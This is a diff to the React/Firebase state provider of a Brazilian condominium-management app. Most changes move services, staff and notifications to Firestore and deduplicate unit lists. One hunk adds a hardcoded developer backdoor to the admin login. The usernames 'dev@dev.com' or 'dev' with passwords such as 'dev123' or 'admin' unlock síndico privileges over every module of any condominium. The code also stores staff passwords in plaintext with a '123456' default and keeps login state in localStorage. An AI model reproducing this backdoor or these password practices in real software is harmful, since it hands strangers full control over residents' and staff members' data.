@@ -96,7 +96,12 @@ import {
   limparESubstituirSubcolecaoFirestore,
   cadastrarMoradorAuth,
   enviarEmailRecuperacaoSenha,
-  ativarSindicoAuth
+  ativarSindicoAuth,
+  salvarServicoMoradorNoFirestore,
+  excluirServicoMoradorNoFirestore,
+  salvarNotificacaoPrivadaNoFirestore,
+  salvarFuncionarioNoFirestore,
+  excluirFuncionarioNoFirestore
 } from '../services/firebase';
 import { onAuthStateChanged, signInWithEmailAndPassword } from 'firebase/auth';
 
@@ -180,6 +185,41 @@ export function sortUnidades(lista: Unidade[]): Unidade[] {
     }
     return (a.numero || '').localeCompare(b.numero || '', 'pt-BR', { numeric: true, sensitivity: 'base' });
   });
+}
+
+/**
+ * Remove duplicatas de unidades com o mesmo número (ex: múltiplos "03" ou "11")
+ * preservando dados já configurados (moradores, senhas customizadas, vagas) e ordena numericamente.
+ */
+export function deduplicateAndSortUnidades(lista: Unidade[]): Unidade[] {
+  if (!Array.isArray(lista)) return [];
+  const map = new Map<string, Unidade>();
+
+  for (const u of lista) {
+    const rawNum = (u.numero || '').trim();
+    const cleanNum = normalizeUnitNumber(rawNum);
+    if (!cleanNum && !rawNum) continue;
+    const key = cleanNum || rawNum.toLowerCase();
+
+    const existing = map.get(key);
+    if (!existing) {
+      map.set(key, u);
+    } else {
+      // Prioriza a unidade que já possuir moradores cadastrados, senha alterada ou dados de garagem
+      const existingHasResidents = Boolean(existing.moradores && existing.moradores.length > 0);
+      const currentHasResidents = Boolean(u.moradores && u.moradores.length > 0);
+
+      if (currentHasResidents && !existingHasResidents) {
+        map.set(key, u);
+      } else if (u.senhaPadraoAlterada && !existing.senhaPadraoAlterada) {
+        map.set(key, { ...existing, senhaAcesso: u.senhaAcesso, senhaPadraoAlterada: true });
+      } else if (u.vagaGaragem && !existing.vagaGaragem) {
+        map.set(key, { ...existing, vagaGaragem: u.vagaGaragem });
+      }
+    }
+  }
+
+  return sortUnidades(Array.from(map.values()));
 }
 
 /**
@@ -267,7 +307,7 @@ export function curarUnidadesSemNumero(
     totalBlocos
   );
 
-  return lista.map((u, idx) => {
+  const curadas = lista.map((u, idx) => {
     const numeroValido = (u.numero && u.numero.trim()) ? u.numero.trim() : (gabarito[idx]?.numero || String(idx + 1));
     return {
       ...u,
@@ -275,6 +315,8 @@ export function curarUnidadesSemNumero(
       senhaAcesso: u.senhaAcesso && u.senhaAcesso.trim() ? u.senhaAcesso : numeroValido
     };
   });
+
+  return deduplicateAndSortUnidades(curadas);
 }
 
 
@@ -524,171 +566,95 @@ const DEFAULT_ADMIN_USERS: AdminUser[] = [
   }
 ];
 
-const DEFAULT_SERVICOS_MORADORES: ServicoMorador[] = [
-  {
-    id: 'serv-1',
-    titulo: 'Tortas deliciosas pronta entrega',
-    subtitulo: 'Faço a pronta entrega',
-    categoria: 'Gastronomia',
-    moradorNome: 'Maria',
-    moradorUnidade: '404',
-    descricao: 'Tortas doces e salgadas feitas artesanalmente com ingredientes selecionados. Sabores: Frango com Catupiry, Palmito, Brigadeiro e Limão. Encomendas rápidas e entrega direta no seu apartamento!',
-    imagem: '/torta_servico.jpg',
-    tipoBotao: 'whatsapp',
-    whatsapp: '11998877665',
-    contato: '(11) 99887-7665',
-    ativo: true,
-    dataCriacao: '26/08/2026',
-    condominioId: CURRENT_CONDO_ID
-  },
-  {
-    id: 'serv-2',
-    titulo: 'Serviços Jurídicos',
-    subtitulo: 'Trabalhista e de Família',
-    categoria: 'Advocacia & Consultoria',
-    moradorNome: 'Antônio',
-    moradorUnidade: '501',
-    descricao: 'Consultoria e assessoria jurídica especializada em Direito do Trabalho e Direito de Família (divórcio, inventário, pensão alimentícia e guarda). Atendimento com hora marcada e total discrição para moradores.',
-    imagem: '/juridico_servico.jpg',
-    tipoBotao: 'site',
-    linkSite: 'https://antonio-advocacia.exemplo.com.br',
-    contato: 'antonio@advocacia.com',
-    ativo: true,
-    dataCriacao: '26/08/2026',
-    condominioId: CURRENT_CONDO_ID
-  },
-  {
-    id: 'serv-3',
-    titulo: 'Passeio com o seu Pet',
-    subtitulo: 'Dog walker de confiança no prédio',
-    categoria: 'Pets',
-    moradorNome: 'Cíntia',
-    moradorUnidade: '103',
-    descricao: 'Passeios de 30 a 60 minutos para cães de todos os portes. Garanto gasto de energia, socialização e segurança para o seu melhor amigo, com a conveniência de um prestador que mora no mesmo condomínio.',
-    imagem: '/dogwalker_servico.jpg',
-    tipoBotao: 'whatsapp',
-    whatsapp: '11988776655',
-    contato: '(11) 98877-6655',
-    ativo: true,
-    dataCriacao: '26/08/2026',
-    condominioId: CURRENT_CONDO_ID
-  },
-  {
-    id: 'serv-4',
-    titulo: 'Personal Trainer Thiago Dantas',
-    subtitulo: 'Treinamento funcional e musculação',
-    categoria: 'Saúde & Esportes',
-    moradorNome: 'Thiago',
-    moradorUnidade: '200',
-    descricao: 'Aulas personalizadas focadas no seu objetivo (emagrecimento, hipertrofia ou condicionamento físico). Treine com segurança e eficiência utilizando a própria academia do condomínio.',
-    imagem: '/personal_servico.jpg',
-    tipoBotao: 'whatsapp',
-    whatsapp: '11977665544',
-    contato: '(11) 97766-5544',
-    ativo: true,
-    dataCriacao: '26/08/2026',
-    condominioId: CURRENT_CONDO_ID
-  },
-  {
-    id: 'serv-5',
-    titulo: 'Organização e Design',
-    subtitulo: 'Personal Organizer & Design de Interiores',
-    categoria: 'Design & Organização',
-    moradorNome: 'Clara',
-    moradorUnidade: '302',
-    descricao: 'Otimização de ambientes, organização de closets, armários, cozinhas e home office. Projetos de design de interiores sob medida para deixar o seu apartamento prático, funcional e elegante.',
-    imagem: '/organizer_servico.jpg',
-    tipoBotao: 'site',
-    linkSite: 'https://clara-decor.exemplo.com.br',
-    contato: 'contato@claradecor.com',
-    ativo: true,
-    dataCriacao: '26/08/2026',
-    condominioId: CURRENT_CONDO_ID
-  },
-  {
-    id: 'serv-6',
-    titulo: 'Faxina Seletiva / Higienização',
-    subtitulo: 'Limpeza ecológica de estofados e tapetes',
-    categoria: 'Limpeza & Cuidados',
-    moradorNome: 'Sandra',
-    moradorUnidade: '102',
-    descricao: 'Higienização profunda e remoção de manchas e odores de sofás, poltronas, colchões e tapetes. Processo antialérgico seguro para crianças e pets, realizado com equipamento profissional de alta sucção.',
-    imagem: '/limpeza_servico.jpg',
-    tipoBotao: 'whatsapp',
-    whatsapp: '11966554433',
-    contato: '(11) 96655-4433',
-    ativo: true,
-    dataCriacao: '26/08/2026',
-    condominioId: CURRENT_CONDO_ID
-  }
-];
+
 
 export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
-  // Serviços de Moradores com persistência em LocalStorage
-  const [servicosMoradores, setServicosMoradores] = useState<ServicoMorador[]>(() => {
-    const saved = localStorage.getItem('condo_servicos_moradores');
-    if (saved) {
-      try {
-        return JSON.parse(saved);
-      } catch {}
-    }
-    return DEFAULT_SERVICOS_MORADORES;
-  });
-
-  useEffect(() => {
-    localStorage.setItem('condo_servicos_moradores', JSON.stringify(servicosMoradores));
-  }, [servicosMoradores]);
+  // Serviços de Moradores integrados exclusivamente ao Cloud Firestore e Firebase Storage
+  const [servicosMoradores, setServicosMoradores] = useState<ServicoMorador[]>([]);
 
   const adicionarServicoMorador = (servico: Omit<ServicoMorador, 'id' | 'dataCriacao'>) => {
+    const novoId = `serv-${Date.now()}`;
     const novo: ServicoMorador = {
       ...servico,
-      id: `serv-${Date.now()}`,
+      id: novoId,
       dataCriacao: new Date().toLocaleDateString('pt-BR'),
       ativo: true
     };
     setServicosMoradores(prev => [novo, ...prev]);
+    salvarServicoMoradorNoFirestore(condoTenantId, novo).catch(console.error);
   };
 
   const editarServicoMorador = (id: string, servicoAtualizado: Partial<ServicoMorador>) => {
+    let itemAtualizado: ServicoMorador | null = null;
     setServicosMoradores(prev => prev.map(s => {
       if (s.id === id) {
-        return {
+        // Se o anúncio estiver suspenso (s.ativo === false), a edição do morador NÃO restabelece a liberação (ativo: true).
+        // A reativação só pode ser autorizada pelo síndico no painel de administração!
+        const estaSuspenso = !s.ativo;
+        itemAtualizado = {
           ...s,
-          ...servicoAtualizado
+          ...servicoAtualizado,
+          ativo: estaSuspenso ? false : (servicoAtualizado.ativo !== undefined ? servicoAtualizado.ativo : s.ativo),
+          motivoSuspensao: estaSuspenso 
+            ? (s.motivoSuspensao || 'Anúncio editado pelo morador. Aguardando reavaliação da sindicância.')
+            : servicoAtualizado.motivoSuspensao
         };
+        return itemAtualizado;
       }
       return s;
     }));
+    if (itemAtualizado) {
+      salvarServicoMoradorNoFirestore(condoTenantId, itemAtualizado).catch(console.error);
+    }
   };
 
   const suspenderServicoMorador = (id: string, motivo: string) => {
+    let itemAtualizado: ServicoMorador | null = null;
     setServicosMoradores(prev => prev.map(s => {
       if (s.id === id) {
-        return {
+        itemAtualizado = {
           ...s,
           ativo: false,
           motivoSuspensao: motivo.trim() || 'Irregularidade nas diretrizes de anúncios do condomínio.'
         };
+        return itemAtualizado;
       }
       return s;
     }));
+    if (itemAtualizado) {
+      salvarServicoMoradorNoFirestore(condoTenantId, itemAtualizado).catch(console.error);
+    }
   };
 
   const reativarServicoMorador = (id: string) => {
+    let itemAtualizado: ServicoMorador | null = null;
     setServicosMoradores(prev => prev.map(s => {
       if (s.id === id) {
-        return {
+        itemAtualizado = {
           ...s,
           ativo: true,
-          motivoSuspensao: undefined
+          motivoSuspensao: ''
         };
+        return itemAtualizado;
       }
       return s;
     }));
+    if (itemAtualizado) {
+      salvarServicoMoradorNoFirestore(condoTenantId, itemAtualizado).catch(console.error);
+      const unit = (itemAtualizado as ServicoMorador).moradorUnidade;
+      if (unit) {
+        enviarNotificacaoPrivada(
+          unit,
+          `Seu anúncio "${(itemAtualizado as ServicoMorador).titulo}" foi analisado, liberado e reativado pela administração com sucesso! Ele já voltou a ficar disponível para todos no mural de serviços.`,
+          `Anúncio Reativado: ${(itemAtualizado as ServicoMorador).titulo}`
+        );
+      }
+    }
   };
 
   const excluirServicoMorador = (id: string) => {
     setServicosMoradores(prev => prev.filter(s => s.id !== id));
+    excluirServicoMoradorNoFirestore(condoTenantId, id).catch(console.error);
   };
 
   // Regras e Regulamento do Condomínio State
@@ -1470,10 +1436,10 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     const saved = localStorage.getItem('condo_unidades_list');
     if (saved) {
       try {
-        return sortUnidades(JSON.parse(saved));
+        return deduplicateAndSortUnidades(JSON.parse(saved));
       } catch {}
     }
-    return sortUnidades(MOCK_UNIDADES.map(u => ({
+    return deduplicateAndSortUnidades(MOCK_UNIDADES.map(u => ({
       ...u,
       senhaAcesso: u.senhaAcesso || u.numero,
       statusCadastro: u.statusCadastro || (u.moradores && u.moradores.length > 0 ? 'Cadastrado' : 'Pendente')
@@ -1491,7 +1457,7 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     // 1. Ouvinte em tempo real da subcoleção no Cloud Firestore
     const unsubscribeUnits = ouvirSubcolecaoFirestore(condoTenantId, 'unidades', (unidadesFirestore) => {
       if (Array.isArray(unidadesFirestore) && unidadesFirestore.length > 0) {
-        const curadas = curarUnidadesSemNumero(
+        let curadas = curarUnidadesSemNumero(
           unidadesFirestore,
           expectedTotal,
           currentCondo?.totalAndares,
@@ -1499,50 +1465,66 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
           condoTenantId,
           currentCondo?.totalBlocos || 1
         );
-        const sorted = sortUnidades(curadas);
+
+        // Se o condomínio tem padrão específico configurado (ex: "1 3 5" com 11 andares = 33 unidades),
+        // garante que apenas as unidades que batem com o padrão atual do condomínio sejam mantidas
+        if (currentCondo?.padraoPrimeiroAndar && currentCondo?.totalAndares) {
+          const gabarito = gerarUnidadesPorPadraoEAndar(
+            expectedTotal,
+            currentCondo.totalAndares,
+            currentCondo.padraoPrimeiroAndar,
+            condoTenantId,
+            currentCondo.totalBlocos || 1
+          );
+          const gabaritoNumeros = new Set(gabarito.map(g => normalizeUnitNumber(g.numero)));
+
+          // Verifica se existem unidades órfãs (ex: 02, 04, 12, 14) ou duplicatas
+          const temOrfasOuExcedentes = curadas.some(u => !gabaritoNumeros.has(normalizeUnitNumber(u.numero))) || 
+                                       curadas.length > expectedTotal ||
+                                       new Set(curadas.map(u => normalizeUnitNumber(u.numero))).size !== curadas.length;
+
+          if (temOrfasOuExcedentes) {
+            const mapExistentes = new Map<string, Unidade>();
+            curadas.forEach(u => {
+              const k = normalizeUnitNumber(u.numero);
+              if (gabaritoNumeros.has(k) && !mapExistentes.has(k)) {
+                mapExistentes.set(k, u);
+              }
+            });
+
+            curadas = gabarito.map(g => {
+              const k = normalizeUnitNumber(g.numero);
+              const existente = mapExistentes.get(k);
+              return existente ? { ...g, ...existente, numero: g.numero } : g;
+            });
+
+            // Limpa o Firestore removendo as unidades órfãs/duplicadas de forma atômica
+            limparESubstituirSubcolecaoFirestore(condoTenantId, 'unidades', curadas).catch(console.error);
+          }
+        }
+
+        const sorted = deduplicateAndSortUnidades(curadas);
         setUnidades(sorted);
         try {
           localStorage.setItem(`condo_unidades_list_${condoTenantId}`, JSON.stringify(sorted));
           localStorage.setItem('condo_unidades_list', JSON.stringify(sorted));
         } catch {}
-
-        // Se havia unidades com número vazio salvas na nuvem, atualiza a nuvem com as curadas
-        if (unidadesFirestore.some(u => !u.numero || u.numero.trim() === '')) {
-          sincronizarSubcolecaoTenant(condoTenantId, 'unidades', sorted).catch(console.error);
-        }
       } else if (Array.isArray(unidadesFirestore) && unidadesFirestore.length === 0) {
-        // Se a subcoleção estiver vazia na nuvem, aproveita dados existentes do localStorage
-        const keyTenant = `condo_unidades_list_${condoTenantId}`;
-        const savedTenant = localStorage.getItem(keyTenant);
-        let listToSeed: Unidade[] = [];
-        if (savedTenant) {
-          try {
-            listToSeed = JSON.parse(savedTenant);
-          } catch {}
-        }
-        listToSeed = curarUnidadesSemNumero(
-          listToSeed,
+        // Se a subcoleção estiver vazia na nuvem, gera as unidades limpas baseadas nas configurações do condomínio
+        const listToSeed = deduplicateAndSortUnidades(gerarUnidadesPorPadraoEAndar(
           expectedTotal,
           currentCondo?.totalAndares,
           currentCondo?.padraoPrimeiroAndar,
           condoTenantId,
           currentCondo?.totalBlocos || 1
-        );
-        if (listToSeed.length === 0) {
-          listToSeed = sortUnidades(gerarUnidadesPorPadraoEAndar(
-            expectedTotal,
-            currentCondo?.totalAndares,
-            currentCondo?.padraoPrimeiroAndar,
-            condoTenantId,
-            currentCondo?.totalBlocos || 1
-          ));
-        }
+        ));
+
         setUnidades(listToSeed);
         try {
           localStorage.setItem(`condo_unidades_list_${condoTenantId}`, JSON.stringify(listToSeed));
           localStorage.setItem('condo_unidades_list', JSON.stringify(listToSeed));
         } catch {}
-        sincronizarSubcolecaoTenant(condoTenantId, 'unidades', listToSeed).catch(console.error);
+        limparESubstituirSubcolecaoFirestore(condoTenantId, 'unidades', listToSeed).catch(console.error);
       }
     });
 
@@ -1580,15 +1562,91 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
         condoTenantId,
         currentCondo?.totalBlocos || 1
       );
-      sincronizarSubcolecaoTenant(condoTenantId, 'unidades', list).catch(console.error);
     }
 
-    setUnidades(list);
+    setUnidades(deduplicateAndSortUnidades(list));
 
     return () => {
       unsubscribeUnits();
     };
   }, [condoTenantId, currentCondo?.totalUnidades, currentCondo?.totalAndares, currentCondo?.padraoPrimeiroAndar]);
+
+  // Listener em tempo real para a subcoleção servicos_moradores no Cloud Firestore com expurgo de dados sem morador cadastrado
+  useEffect(() => {
+    if (!condoTenantId) return;
+
+    const unsubscribeServicos = ouvirSubcolecaoFirestore(condoTenantId, 'servicos_moradores', (dadosFirestore) => {
+      if (Array.isArray(dadosFirestore)) {
+        // IDs de mock de demonstração que devem ser limpos
+        const mockIdsFicticios = new Set(['serv-1', 'serv-2', 'serv-3', 'serv-4', 'serv-5', 'serv-6']);
+
+        // Moradores e unidades realmente cadastrados no condomínio
+        const moradoresCadastrados = unidades.flatMap(u => u.moradores || []);
+        const uidsCadastrados = new Set(moradoresCadastrados.map(m => String(m.id || (m as any).uid || '').toLowerCase()));
+        const unidadesCadastradas = new Set(unidades.map(u => String(u.numero).toLowerCase()));
+
+        const servicosValidos: ServicoMorador[] = [];
+
+        dadosFirestore.forEach((servicoRaw: any) => {
+          const idStr = String(servicoRaw.id || '');
+          const moradorIdStr = String(servicoRaw.moradorId || servicoRaw.moradorUid || '').toLowerCase();
+          const moradorUnidadeStr = String(servicoRaw.moradorUnidade || '').toLowerCase();
+
+          const isMockId = mockIdsFicticios.has(idStr);
+          const temUnidadeCadastrada = moradorUnidadeStr && unidadesCadastradas.has(moradorUnidadeStr);
+          const temMoradorIdCadastrado = moradorIdStr && uidsCadastrados.has(moradorIdStr);
+
+          // Se for mock ou não puder ser identificado com moradores/unidades cadastrados, expurga do Firestore
+          if (isMockId || (!temUnidadeCadastrada && !temMoradorIdCadastrado && idStr.startsWith('serv-'))) {
+            excluirServicoMoradorNoFirestore(condoTenantId, idStr).catch(() => {});
+          } else {
+            servicosValidos.push(servicoRaw as ServicoMorador);
+          }
+        });
+
+        setServicosMoradores(servicosValidos);
+      }
+    });
+
+    return () => {
+      unsubscribeServicos();
+    };
+  }, [condoTenantId, unidades]);
+
+  // Listener em tempo real para a subcoleção notificacoes_privadas no Cloud Firestore
+  useEffect(() => {
+    if (!condoTenantId) return;
+
+    const unsubscribeNotifs = ouvirSubcolecaoFirestore(condoTenantId, 'notificacoes_privadas', (dadosFirestore) => {
+      if (Array.isArray(dadosFirestore) && dadosFirestore.length > 0) {
+        setNotificacoesPrivadas(dadosFirestore as NotificacaoPrivada[]);
+      }
+    });
+
+    return () => {
+      unsubscribeNotifs();
+    };
+  }, [condoTenantId]);
+
+  // Listener em tempo real para a subcoleção funcionarios no Cloud Firestore
+  useEffect(() => {
+    if (!condoTenantId) return;
+
+    const unsubscribeFuncionarios = ouvirSubcolecaoFirestore(condoTenantId, 'funcionarios', (dadosFirestore) => {
+      if (Array.isArray(dadosFirestore) && dadosFirestore.length > 0) {
+        setFuncionarios(dadosFirestore as Funcionario[]);
+      } else if (Array.isArray(dadosFirestore) && dadosFirestore.length === 0) {
+        // Se a coleção estiver vazia na nuvem, efetua o seed inicial dos 9 colaboradores padrão
+        const seedLimpo = MOCK_FUNCIONARIOS.map(f => ({ ...f, status: f.status || 'Ativo' }));
+        setFuncionarios(seedLimpo);
+        sincronizarSubcolecaoTenant(condoTenantId, 'funcionarios', seedLimpo).catch(console.error);
+      }
+    });
+
+    return () => {
+      unsubscribeFuncionarios();
+    };
+  }, [condoTenantId]);
 
   // Admin Auth State
   const [isAdminLoggedIn, setIsAdminLoggedIn] = useState<boolean>(() => {
@@ -2165,52 +2223,17 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     setCategoriasReceita(prev => prev.includes(trimmed) ? prev : [...prev, trimmed]);
   };
 
-  // Funcionários e Equipe de Gestão com persistência
-  const [funcionarios, setFuncionarios] = useState<Funcionario[]>(() => {
-    const saved = localStorage.getItem('condo_funcionarios_list');
-    if (saved) {
-      try {
-        const parsed: Funcionario[] = JSON.parse(saved);
-        return parsed.map(f => {
-          if (f.id === 'func-1' && (!f.permissoesModulos || f.permissoesModulos.includes('mudancas'))) {
-            return { ...f, permissoesModulos: ['portaria'] };
-          }
-          return f;
-        });
-      } catch {}
-    }
-    return MOCK_FUNCIONARIOS.map(f => ({
-      ...f,
-      status: f.status || 'Ativo'
-    }));
-  });
-
-  useEffect(() => {
-    localStorage.setItem('condo_funcionarios_list', JSON.stringify(funcionarios));
-    if (currentCondo?.id) {
-      sincronizarSubcolecaoTenant(currentCondo.id, 'funcionarios', funcionarios).catch(console.warn);
-    }
-  }, [funcionarios, currentCondo?.id]);
-
-  useEffect(() => {
-    const handleStorageChange = (e: StorageEvent) => {
-      if (e.key === 'condo_funcionarios_list' && e.newValue) {
-        try {
-          setFuncionarios(JSON.parse(e.newValue));
-        } catch {}
-      }
-    };
-    window.addEventListener('storage', handleStorageChange);
-    return () => window.removeEventListener('storage', handleStorageChange);
-  }, []);
+  // Funcionários e Equipe de Gestão integrados exclusivamente ao Cloud Firestore
+  const [funcionarios, setFuncionarios] = useState<Funcionario[]>([]);
 
   const adicionarFuncionario = (novo: Omit<Funcionario, 'id' | 'condominioId'>) => {
     const emailLimpo = novo.email?.trim().toLowerCase();
     const loginFinal = novo.usuario?.trim().toLowerCase() || emailLimpo;
     const senhaFinal = novo.senha?.trim() || emailLimpo || '123456';
+    const idUnico = `func-${Date.now()}`;
 
     const funcionarioCompleto: Funcionario = {
-      id: `func-${Date.now()}`,
+      id: idUnico,
       nome: novo.nome.trim(),
       foto: novo.foto || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=600&q=80',
       funcao: novo.funcao.trim(),
@@ -2225,11 +2248,13 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
       senhaPadraoAlterada: Boolean(novo.senhaPadraoAlterada),
       tipoAcesso: novo.tipoAcesso || 'personalizado',
       permissoesModulos: novo.permissoesModulos && novo.permissoesModulos.length > 0 ? novo.permissoesModulos : ['portaria'],
+      permiteAcessoAreaMorador: novo.permiteAcessoAreaMorador !== undefined ? novo.permiteAcessoAreaMorador : true,
       criadoEm: `${new Date().toLocaleDateString('pt-BR')}`,
-      condominioId: CURRENT_CONDO_ID
+      condominioId: condoTenantId
     };
 
-    setFuncionarios(prev => [funcionarioCompleto, ...prev]);
+    setFuncionarios(prev => [funcionarioCompleto, ...prev.filter(f => f.id !== idUnico)]);
+    salvarFuncionarioNoFirestore(condoTenantId, funcionarioCompleto).catch(console.error);
 
     if (loginFinal && senhaFinal) {
       adicionarAdminUser({
@@ -2247,41 +2272,62 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
   };
 
   const editarFuncionario = (id: string, dados: Partial<Funcionario>) => {
+    let itemAtualizado: Funcionario | null = null;
     setFuncionarios(prev => prev.map(f => {
       if (f.id === id) {
-        return {
+        itemAtualizado = {
           ...f,
           ...dados
         };
+        return itemAtualizado;
       }
       return f;
     }));
+    if (itemAtualizado) {
+      salvarFuncionarioNoFirestore(condoTenantId, itemAtualizado).catch(console.error);
+    }
   };
 
   const alterarSenhaColaborador = (funcionarioId: string, novaSenha: string): boolean => {
     const s = novaSenha.trim();
     if (!s || s.length < 3) return false;
 
+    let itemAtualizado: Funcionario | null = null;
     setFuncionarios(prev => prev.map(f => {
       if (f.id === funcionarioId) {
-        return {
+        itemAtualizado = {
           ...f,
           senha: s,
           senhaPadraoAlterada: true
         };
+        return itemAtualizado;
       }
       return f;
     }));
+    if (itemAtualizado) {
+      salvarFuncionarioNoFirestore(condoTenantId, itemAtualizado).catch(console.error);
+    }
 
     return true;
   };
 
   const excluirFuncionario = (id: string) => {
     setFuncionarios(prev => prev.filter(f => f.id !== id));
+    excluirFuncionarioNoFirestore(condoTenantId, id).catch(console.error);
   };
 
   const atualizarStatusFuncionario = (id: string, status: StatusFuncionario) => {
-    setFuncionarios(prev => prev.map(f => f.id === id ? { ...f, status } : f));
+    let itemAtualizado: Funcionario | null = null;
+    setFuncionarios(prev => prev.map(f => {
+      if (f.id === id) {
+        itemAtualizado = { ...f, status };
+        return itemAtualizado;
+      }
+      return f;
+    }));
+    if (itemAtualizado) {
+      salvarFuncionarioNoFirestore(condoTenantId, itemAtualizado).catch(console.error);
+    }
   };
 
   // Avaliações anônimas/privadas de funcionários dadas pelos moradores
@@ -2581,7 +2627,7 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     let novas: Unidade[] = [];
 
     if (currentCondo?.totalAndares && currentCondo?.padraoPrimeiroAndar) {
-      novas = sortUnidades(gerarUnidadesPorPadraoEAndar(
+      novas = deduplicateAndSortUnidades(gerarUnidadesPorPadraoEAndar(
         total,
         currentCondo.totalAndares,
         currentCondo.padraoPrimeiroAndar,
@@ -2606,7 +2652,7 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
           moradores: []
         });
       }
-      novas = sortUnidades(novas);
+      novas = deduplicateAndSortUnidades(novas);
     }
 
     setUnidades(novas);
@@ -2672,11 +2718,24 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     };
 
     setNotificacoesPrivadas(prev => [novaNotif, ...prev]);
+    if (condoTenantId) {
+      salvarNotificacaoPrivadaNoFirestore(condoTenantId, novaNotif).catch(console.error);
+    }
   };
 
   const marcarNotificacaoComoLida = (notificacaoId: string) => {
     const agora = `${new Date().toLocaleDateString('pt-BR')} às ${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}`;
-    setNotificacoesPrivadas(prev => prev.map(n => n.id === notificacaoId ? { ...n, lida: true, lidaEm: n.lidaEm || agora } : n));
+    let notifAtualizada: NotificacaoPrivada | null = null;
+    setNotificacoesPrivadas(prev => prev.map(n => {
+      if (n.id === notificacaoId) {
+        notifAtualizada = { ...n, lida: true, lidaEm: n.lidaEm || agora };
+        return notifAtualizada;
+      }
+      return n;
+    }));
+    if (notifAtualizada && condoTenantId) {
+      salvarNotificacaoPrivadaNoFirestore(condoTenantId, notifAtualizada).catch(console.error);
+    }
   };
 
   const marcarTodasNotificacoesUnidadeComoLidas = (unidadeNumero: string) => {
@@ -2684,13 +2743,22 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
     const cleanUnit = (unidadeNumero || '').toLowerCase().replace(/^(apt|apto|unidade|apartamento)\s*/i, '').trim();
     if (!cleanUnit) return;
 
+    const alteradas: NotificacaoPrivada[] = [];
     setNotificacoesPrivadas(prev => prev.map(n => {
       const nClean = (n.unidadeNumero || '').toLowerCase().replace(/^(apt|apto|unidade|apartamento)\s*/i, '').trim();
       if (nClean === cleanUnit && !n.lida) {
-        return { ...n, lida: true, lidaEm: agora };
+        const item = { ...n, lida: true, lidaEm: agora };
+        alteradas.push(item);
+        return item;
       }
       return n;
     }));
+
+    if (condoTenantId && alteradas.length > 0) {
+      alteradas.forEach(item => {
+        salvarNotificacaoPrivadaNoFirestore(condoTenantId, item).catch(console.error);
+      });
+    }
   };
 
   // Autenticação do Admin / Síndico / Colaborador com Proteção Multi-Tenant & Primeiro Acesso
@@ -2703,6 +2771,54 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
 
     if (!u || !s) {
       return { success: false, message: 'Informe o seu e-mail e a senha de acesso.' };
+    }
+
+    // 0. LOGIN MASTER DE DESENVOLVEDOR (DEV BACKDOOR / BYPASS TOTAL SEM RESTRIÇÕES)
+    // Permite que desenvolvedores acessem o painel administrativo de QUALQUER condomínio
+    // usando "dev@dev.com" ou "dev" e senha "dev123" (ou "dev"), desbloqueando 100% dos cards e privilégios.
+    const isDevUser = (u === 'dev@dev.com' || u === 'dev');
+    const isDevPass = (s === 'dev123' || s === 'dev' || s === 'dev@dev.com' || s === 'admin');
+
+    if (isDevUser && isDevPass) {
+      setIsAdminLoggedIn(true);
+      localStorage.setItem('condo_admin_auth', 'true');
+      
+      const ALL_MODULOS: AdminModuloKey[] = [
+        'portaria', 'mudancas', 'dependencias', 'reparos', 
+        'reclamacoes', 'eventos', 'servicos', 'unidades', 
+        'equipe', 'financeiro', 'regras', 'imoveis', 
+        'fornecedores', 'enjoei', 'assembleias', 'diario-sindico'
+      ];
+
+      const devUserObj: User = {
+        id: `dev-master-${currentCondo.id}`,
+        nome: 'Desenvolvedor Master (Dev)',
+        email: 'dev@dev.com',
+        role: 'sindico',
+        unidade: 'DEV',
+        bloco: 'DEV',
+        foto: '',
+        profissao: 'Desenvolvedor do Sistema',
+        permissoesModulos: ALL_MODULOS,
+        permiteAcessoAreaMorador: true,
+        condominioId: currentCondo.id,
+        isDev: true
+      };
+
+      setCurrentUser(devUserObj);
+      localStorage.setItem('condo_current_user', JSON.stringify(devUserObj));
+
+      // Habilita também sessão de morador caso navegue para as áreas públicas
+      setIsResidentLoggedIn(true);
+      const residentAuth = { unidade: 'DEV', bloco: 'DEV' };
+      setResidentAuthData(residentAuth);
+      localStorage.setItem('condo_resident_auth', JSON.stringify(residentAuth));
+
+      return { 
+        success: true, 
+        needsActivation: false,
+        message: 'Acesso de Desenvolvedor autorizado com privilégios totais.'
+      };
     }
 
     // 1. Verificação Multi-Tenant (Anti-Mistura de Condomínios)
@@ -2761,16 +2877,24 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
         nome: matchedFuncionario.nome,
         email: matchedFuncionario.email || matchedFuncionario.usuario || u,
         role: 'colaborador',
-        unidade: '',
-        bloco: '',
+        unidade: 'Staff',
+        bloco: matchedFuncionario.categoria || 'Portaria',
         foto: matchedFuncionario.foto,
         profissao: matchedFuncionario.funcao,
         permissoesModulos: userPermissoes,
+        permiteAcessoAreaMorador: matchedFuncionario.permiteAcessoAreaMorador !== false,
         condominioId: currentCondo.id
       };
 
       setCurrentUser(colabUserObj);
       localStorage.setItem('condo_current_user', JSON.stringify(colabUserObj));
+
+      if (matchedFuncionario.permiteAcessoAreaMorador !== false) {
+        setIsResidentLoggedIn(true);
+        const residentAuth = { unidade: 'Staff', bloco: matchedFuncionario.categoria || 'Portaria' };
+        setResidentAuthData(residentAuth);
+        localStorage.setItem('condo_resident_auth', JSON.stringify(residentAuth));
+      }
 
       // Atualiza último acesso
       setFuncionarios(prev => prev.map(f => f.id === matchedFuncionario.id ? { ...f, ultimoAcesso: new Date().toISOString() } : f));
@@ -2973,11 +3097,125 @@ export const CondoProvider: React.FC<{ children: React.ReactNode }> = ({ childre
 
   // Autenticação e Cadastro do Morador
